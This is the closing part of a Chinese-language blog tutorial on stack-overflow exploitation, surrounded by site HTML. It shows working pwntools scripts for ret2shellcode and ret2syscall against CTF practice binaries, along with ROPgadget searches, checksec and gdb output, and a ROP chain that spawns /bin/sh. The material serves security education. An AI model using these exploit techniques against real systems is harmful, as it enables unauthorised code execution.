-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">target = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">target_addr = <span class="number">0x0804a080</span></span><br><span class="line"></span><br><span class="line">payload = shellcode.ljust(<span class="number">112</span>, <span class="string">b&#x27;A&#x27;</span>) + p32(target_addr)</span><br><span class="line">target.sendline(payload)</span><br><span class="line"></span><br><span class="line">target.interactive()</span><br></pre></td></tr></table></figure>
-<p>ok。拿张图说明一下：</p>
-<p><img src="ret2shellcode_explain.jpg" /></p>
-<h1 id="更进一步ret2syscall">更进一步，ret2syscall</h1>
-<p>前面的ret2shellcode有着比较严格的条件，就是要求NX
-disabled。如果程序设置了数据执行保护，那么这种方式就无法实现了。</p>
-<p>一个思路是去构造ROP chain。ROP
-chain可以利用程序中间的一系列ret指令来实现修改寄存器、进行系统调用等功能。</p>
-<p><img src="ropchain.jpg" /></p>
-<p>如果我们想要进行一个系统调用的话，我们需要给一些寄存器设定好参数。32位系统调用execve的时候，系统调用号<code>EAX</code>为<code>0xb</code>，<code>EBX</code>为一个指向<code>/bin/sh</code>（或者你要调用的命令）的指针，<code>ECX</code>和<code>EDX</code>都是0，设置好四个寄存器之后，执行指令<code>int 0x80</code>就可以进行系统调用了。</p>
-<p>以设置EAX为例，我们寻找到一段代码<code>pop eax; ret</code>。接下来我们向栈中压入（溢出）三个数据：<code>返回地址</code>，<code>0xb</code>，前面代码段的地址。</p>
-<p>这样，我们运行到<code>ret</code>语句时，就会跳转到<code>pop eax; ret</code>，执行完<code>pop eax</code>之后，现在栈顶的<code>0xb</code>弹出进入<code>eax</code>，接下来再<code>ret</code>到我们设置的地址。这样子我们也就完成了一个寄存器的修改。</p>
-<p>以这个<a
-target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">程序</a>为例。</p>
-<p>拖进IDA进行反编译，看到<code>main</code>函数存在栈溢出：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you plan to do?&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>同时跑一下checksec：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   2255) Symbols     No    0               0               rop</span><br></pre></td></tr></table></figure>
-<p>程序开启了NX，那么也就不能ret2shellcode。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EBP  0xffffd598 —▸ 0x8049630 (__libc_csu_fini) ◂— push   ebx</span><br><span class="line">ESP  0xffffd510 —▸ 0xffffd52c ◂— 0x3</span><br></pre></td></tr></table></figure>
-<p>通过gdb调试可以发现，返回地址相对于数组<code>v4</code>基址的偏移还是<code>0xffffd598-0xffffd510-0x1c+0x4=0x70</code>。</p>
-<p>那么我们就开始构造一个ROP chain：</p>
-<p>首先需要设置<code>EAX</code>的值为0xb，我们通过ROP
-gadget寻找这样的指令序列：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary rop --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;    </span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure>
-<p>我们选择第二个。</p>
-<p>接下来同样，寻找设置<code>EBX</code>的指令序列：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary rop --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;    </span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">......</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">......</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure>
-<p>寻找设置ECX的指令序列：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary rop --only &#x27;pop|ret&#x27; | grep &#x27;ecx&#x27; </span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure>
-<p>发现第二条指令能够同时设置<code>EBX,ECX,EDX</code>，我们就直接选择这一条。</p>
-<p>以及字符串'/bin/sh'：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary rop --string &#x27;/bin/sh&#x27; </span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure>
-<p>还有syscall(int 0x80)：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary rop --only &#x27;int&#x27;  </span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 1</span><br></pre></td></tr></table></figure>
-<p>接下来就是关于指令的顺序：在栈溢出之后ret，程序会先执行我们设置的地址处的指令<code>pop eax ; ret</code>，然后执行<code>pop edx ; pop ecx ; pop ebx ; ret</code>，最后执行<code>int 0x80</code>。</p>
-<p>栈上应该是这样的布局：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">+----------+</span><br><span class="line">|0x080bb196| =&gt; pop eax ; ret</span><br><span class="line">+----------+</span><br><span class="line">|0x0000000b| =&gt; EAX=0xb</span><br><span class="line">+----------+</span><br><span class="line">|0x0806eb90| =&gt; pop edx ; pop ecx ; pop ebx ; ret </span><br><span class="line">+----------+</span><br><span class="line">|0x00000000| =&gt; EDX=0x0</span><br><span class="line">+----------+</span><br><span class="line">|0x00000000| =&gt; ECX=0x0</span><br><span class="line">+----------+</span><br><span class="line">|0x080be408| =&gt; EBX=0x080be408 -&gt; &#x27;/bin/sh&#x27;</span><br><span class="line">+----------+</span><br><span class="line">|0x08049421| =&gt; int 0x80</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure>
-<p>这样我们可以编写脚本：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">chains = p32(<span class="number">0x80bb196</span>) + p32(<span class="number">0xb</span>) + p32(<span class="number">0x806eb90</span>) + p32(<span class="number">0x0</span>) + p32(<span class="number">0x0</span>) + p32(<span class="number">0x80be408</span>) + p32(<span class="number">0x8049421</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">b&quot;A&quot;</span> * <span class="number">112</span> + chains)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-<p>运行，getshell.</p>
-<p><img src="rop_exp.jpg" /></p>
-<h1 id="参考资料">参考资料</h1>
-<p>[1]
-https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/</p>
-
-    </article>
-    <!-- license -->
-    
-    <!-- paginator -->
-    <ul class="post-paginator">
-        <li class="next">
-            
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2022/03/30/stackoverflow-ret2libc/" title="栈溢出，ret2libc">
-                    <div class="nextTitle">栈溢出，ret2libc</div>
-                </a>
-            
-        </li>
-        <li class="previous">
-            
-                <div class="prevSlogan">Previous Post</div>
-                <a href="/2022/03/23/mpc-gmw/" title="多方安全计算——GMW协议">
-                    <div class="prevTitle">多方安全计算——GMW协议</div>
-                </a>
-            
-        </li>
-    </ul>
-    <!-- comment -->
-    
-        <div class="post-comment">
-            <!-- 来必力 City 版安装代码 -->
-
-
-            
-
-            
-
-            
-
-            <!-- utteranc评论 -->
-
-
-            <!-- partial('_partial/comment/changyan') -->
-            <!--PC版-->
-
-
-            
-            
-    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
-    <div id="comment"></div>
-    <script>
-        new Valine({
-            el: '#comment',
-            notify:false,
-            verify:false,
-            appId: "amyVU3zcpK0XzPeb5UbFtBXu-MdYXbMMI",
-            appKey: "9LBOiquxlPTvprUxTuN1KqIl",
-            placeholder: "都有啥要说的（",
-            path:window.location.pathname,
-            avatar:'mm',
-            requiredFields: ['nick', 'mail'],
-            serverURLs: "https://amyvu3zc.api.lncldglobal.com"
-        });
-    </script>
-
-
-        </div>
-    
-    <!-- timeliness note -->
-    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
-    
-    <!-- Mathjax -->
-    
-        
-    <script>
-        MathJax = {
-            tex: {
-                inlineMath: [['$', '$'], ['\\(', '\\)']],
-                skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-            }
-        };
-    </script>
-
-    <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
-    <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script>
-
-
-    
-</main>
-
-                <!-- profile -->
-                
-            </div>
-            <footer class="footer footer-unloaded">
-    <!-- social  -->
-    
-        <div class="social">
-            
-    
-        
-            
-                <a href="mailto:2163953074@qq.com" class="iconfont-archer email" title=email ></a>
-            
-        
-    
-        
-            
-                <a href="//github.com/symlPigeon" class="iconfont-archer github" target="_blank" title=github></a>
-            
-        
-    
-        
-            
-                <span class="iconfont-archer qq" title=qq>
-                    
-                    <img class="profile-qr" src="/assets/qq.png" />
-                </span>
-            
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-            
-                <a href="//steamcommunity.com/id/LostinGensokyo/" class="iconfont-archer steam" target="_blank" title=steam></a>
-            
-        
-    
-        
-    
-        
-    
-
-
-        </div>
-    
-    <!-- powered by Hexo  -->
-    <div class="copyright">
-        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
-    </div>
-    <!-- website approve for Chinese user -->
-    
-    <!-- 不蒜子  -->
-    
-        <div class="busuanzi-container">
-            
-             
-                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
-            
-        </div>
-    	
-</footer>
-
-        </div>
-        <!-- toc -->
-        
-            <div class="toc-wrapper toc-wrapper-loding" style=
-
-
-
-
-
-
-
-    top:50vh;
-
->
-                <div class="toc-catalog">
-                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
-                </div>
-                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A0%88%E6%80%8E%E4%B9%88%E5%B0%B1%E6%BA%A2%E5%87%BA%E4%BA%86"><span class="toc-number">1.</span> <span class="toc-text">栈怎么就溢出了</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E8%BF%98%E6%9C%89%E8%BF%94%E5%9B%9E%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88"><span class="toc-number">1.1.</span> <span class="toc-text">函数的调用还有返回发生了什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E6%A0%88%E5%A1%9E%E4%B8%8D%E4%B8%8B%E4%BA%86"><span class="toc-number">1.2.</span> <span class="toc-text">如果栈塞不下了……</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%83%BD%E4%B8%8D%E8%83%BD%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">能不能利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E6%B5%81%E6%98%AF%E4%B8%8D%E6%98%AF%E5%87%BA%E9%97%AE%E9%A2%98%E4%BA%86"><span class="toc-number">2.1.</span> <span class="toc-text">控制流是不是出问题了？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E6%9C%89%E8%BE%93%E5%85%A5%E7%9A%84%E8%AF%9D%E7%84%B6%E5%90%8Eret2text"><span class="toc-number">2.2.</span> <span class="toc-text">如果有输入的话，然后ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8B%E5%AE%9E%E4%B8%8A%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E5%85%B3%E9%97%AD%E4%BA%86"><span class="toc-number">2.3.</span> <span class="toc-text">事实上安全检查关闭了</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E4%B8%8D%E6%98%AFret2text"><span class="toc-number">3.</span> <span class="toc-text">如果不是ret2text</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9B%B4%E8%BF%9B%E4%B8%80%E6%AD%A5ret2syscall"><span class="toc-number">4.</span> <span class="toc-text">更进一步，ret2syscall</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">5.</span> <span class="toc-text">参考资料</span></a></li></ol>
-            </div>
-        
-        <!-- sidebar -->
-        <div class="sidebar sidebar-hide">
-    <ul class="sidebar-tabs sidebar-tabs-active-0">
-        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
-        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
-        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
-    </ul>
-    <div class="sidebar-content sidebar-content-show-archive">
-        <div class="sidebar-panel-archives">
-    <!-- 在 ejs 中将 archive 按照时间排序 -->
-    
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-    
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-    
-    
-    
-    
-    <div class="total-and-search">
-        <div class="total-archive">
-        Total : 17
-        </div>
-        <!-- search  -->
-        
-    </div>
-    
-    <div class="post-archive">
-    
-        
-            
-            
-            <div class="archive-year"> 2022 </div>
-            <ul class="year-list">
-            
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/07</span>
-            <a class="archive-post-title" href="/2022/04/07/typora-reverse-engineering/">针对Typora的逆向分析</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/30</span>
-            <a class="archive-post-title" href="/2022/03/30/stackoverflow-ret2libc/">栈溢出，ret2libc</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/28</span>
-            <a class="archive-post-title" href="/2022/03/28/stackoverflow-learn/">关于栈溢出的一些东西（基本的）</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/23</span>
-            <a class="archive-post-title" href="/2022/03/23/mpc-gmw/">多方安全计算——GMW协议</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/22</span>
-            <a class="archive-post-title" href="/2022/03/22/program-start/">关于一个ELF程序是怎么启动的这件事以及尝试分析然后大失败的结果</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/16</span>
-            <a class="archive-post-title" href="/2022/03/16/wiener-attack/">Wiener's Attack</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/23</span>
-            <a class="archive-post-title" href="/2022/02/23/mpc-2-gc/">安全多方计算——乱码电路协议</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/15</span>
-            <a class="archive-post-title" href="/2022/02/15/re-call/">关于x86调用惯例是啥这件事</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/10</span>
-            <a class="archive-post-title" href="/2022/02/10/re-review2/">ELF格式学习</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/07</span>
-            <a class="archive-post-title" href="/2022/02/07/mpc-1/">安全多方计算——定义、原语</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/20</span>
-            <a class="archive-post-title" href="/2022/01/20/re-review1/">IA32内存、寄存器、数据</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/07</span>
-            <a class="archive-post-title" href="/2022/01/07/some-attack-on-rsa-I/">一些针对RSA的攻击（I）</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/02</span>
-            <a class="archive-post-title" href="/2022/01/02/cbc-padding-oracle-attack/">CBC Padding Oracle Attack</a>
-        </li>
-    
-        
-            
-            
-                
-                </ul>
-            
-            <div class="archive-year"> 2021 </div>
-            <ul class="year-list">
-            
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/09</span>
-            <a class="archive-post-title" href="/2021/12/09/aes-ecb-attack/">Byte-at-a-time ECB Decryption</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/06</span>
-            <a class="archive-post-title" href="/2021/12/06/CVE-2021-39503/">CVE-2021-39503复现</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/03</span>
-            <a class="archive-post-title" href="/2021/12/03/sm2/">国密SM2算法学习</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/03</span>
-            <a class="archive-post-title" href="/2021/12/03/HelloWorld/">HelloWorld</a>
-        </li>
-    
-    </div>
-</div>
-
-        <div class="sidebar-panel-tags">
-    <div class="sidebar-tags-name">
-        
-            <span class="sidebar-tag-name" data-tags="漏洞复现">
-                <span class="iconfont-archer">&#xe606;</span>
-                漏洞复现
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="对称密码和安全">
-                <span class="iconfont-archer">&#xe606;</span>
-                对称密码和安全
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="安全多方计算">
-                <span class="iconfont-archer">&#xe606;</span>
-                安全多方计算
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="ELF">
-                <span class="iconfont-archer">&#xe606;</span>
-                ELF
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="Linux">
-                <span class="iconfont-archer">&#xe606;</span>
-                Linux
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="逆向工程">
-                <span class="iconfont-archer">&#xe606;</span>
-                逆向工程
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="x86">
-                <span class="iconfont-archer">&#xe606;</span>
-                x86
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="公钥密码和数学">
-                <span class="iconfont-archer">&#xe606;</span>
-                公钥密码和数学
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="Pwn">
-                <span class="iconfont-archer">&#xe606;</span>
-                Pwn
-            </span>
-        
-    </div>
-    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
-    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
-        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
-    </div> 
-    <div class="sidebar-tags-list"></div>
-</div>
-
-        <div class="sidebar-panel-categories">
-    <div class="sidebar-categories-name">
-    
-        <span class="sidebar-category-name" data-categories="Web安全">
-            <span class="iconfont-archer">&#xe60a;</span>
-            Web安全
-        </span>
-    
-        <span class="sidebar-category-name" data-categories="密码学">
-            <span class="iconfont-archer">&#xe60a;</span>
-            密码学
-        </span>
-    
-        <span class="sidebar-category-name" data-categories="二进制">
-            <span class="iconfont-archer">&#xe60a;</span>
-            二进制
-        </span>
-    
-    </div>
-    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
-    <div class="sidebar-categories-list"></div>
-</div>
-
-    </div>
-</div>
-
-        <!-- site-meta -->
-        <script>
-    var siteMeta = {
-        url: "http://symlpigeon.github.io",
-        root: "/",
-        author: "symlPigeon"
-    }
-</script>
-
-        <!-- import experimental options here -->
-        <!-- Custom Font -->
-
-
-        <!-- main func -->
-        <script src="/scripts/main.js?v=20210823"></script>
-        <!-- dark mode -->
-        <script src="/scripts/dark.js?v=20210823"></script>
-        <!-- fancybox -->
-        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
-        <!-- algolia -->
-        
-        <!-- busuanzi -->
-        
-            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
-        
-        <!-- CNZZ -->
-        
-        <!-- async load share.js -->
-        
-            <script src="/scripts/share.js?v=20210823" async></script>
-        
-        <!-- mermaid -->
-        
-            <script src='https://cdn.jsdelivr.net/npm/mermaid@8.11.0/dist/mermaid.min.js'></script>
-            <script>
-                if (window.mermaid) {
-                    mermaid.initialize({theme: 'dark'});
-                }
-            </script>
-        
-    </body>
-</html>
+<!-- build time:Wed Apr 13 2022 20:04:14 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="google-site-verification" content="ZTJV7LmnjnAU0rDyvzCr7TRRA440DNEQPOSHt9OiYLE"><script src="https://www.googletagmanager.com/gtag/js?id=G-EDRLRX5SK9"></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-EDRLRX5SK9")</script><link rel="alternate" type="application/rss+xml" title="symlpigeon's little gensokyo" href="http://symlpigeon.github.io/rss.xml"><link rel="alternate" type="application/atom+xml" title="symlpigeon's little gensokyo" href="http://symlpigeon.github.io/atom.xml"><link rel="alternate" type="application/json" title="symlpigeon's little gensokyo" href="http://symlpigeon.github.io/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="Pwn"><link rel="canonical" href="http://symlpigeon.github.io/2022/03/28/stackoverflow-learn/"><title>关于栈溢出的一些东西（基本的） - 二进制 | symlpigeon's little gensokyo = symlpigeon 的个人小站</title><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css"><style type="text/css">.spoiler{display:inline-flex}p.spoiler{display:flex}.spoiler a{pointer-events:none}.spoiler-blur,.spoiler-blur>*{transition:text-shadow .5s ease}.spoiler .spoiler-blur,.spoiler .spoiler-blur>*{color:transparent;background-color:rgba(0,0,0,0);text-shadow:0 0 10px grey;cursor:pointer}.spoiler .spoiler-blur:hover,.spoiler .spoiler-blur:hover>*{text-shadow:0 0 5px grey}.spoiler-box,.spoiler-box>*{transition:color .5s ease,background-color .5s ease}.spoiler .spoiler-box,.spoiler .spoiler-box>*{color:#000;background-color:#000;text-shadow:none}</style><meta name="generator" content="Hexo 5.4.1"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">关于栈溢出的一些东西（基本的）</h1><div class="meta"><span class="item" title="Created: 2022-03-28 21:29:58"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">Posted on</span> <time itemprop="dateCreated datePublished" datetime="2022-03-28T21:29:58+08:00">2022-03-28</time> </span><span class="item" title="Symbols count in article"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">Symbols count in article</span> <span>13k</span> <span class="text">words</span> </span><span class="item" title="Reading time"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">Reading time</span> <span>12 mins.</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="Toggle navigation bar"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul 